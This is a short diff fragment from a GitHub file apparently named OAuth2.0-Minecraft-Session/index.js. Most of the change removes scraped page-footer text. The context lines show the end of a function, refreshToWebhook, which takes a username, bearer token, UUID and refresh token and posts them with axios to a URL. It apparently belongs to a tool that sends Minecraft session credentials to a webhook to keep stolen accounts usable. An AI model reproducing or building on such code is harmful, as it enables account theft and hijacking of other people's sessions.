@@ -304,18 +304,3 @@ function refreshToWebhook(newUsername, newBearerToken, newUuid, newRefreshToken)
         axios.post(url, data).then(() => console.log("Successfully refreshed token."))
     
 }
-Footer
-© 2023 GitHub, Inc.
-Footer navigation
-Terms
-Privacy
-Security
-Status
-Docs
-Contact GitHub
-Pricing
-API
-Training
-Blog
-About
-OAuth2.0-Minecraft-Session/index.js at main · mahodao/OAuth2.0-Minecraft-Session
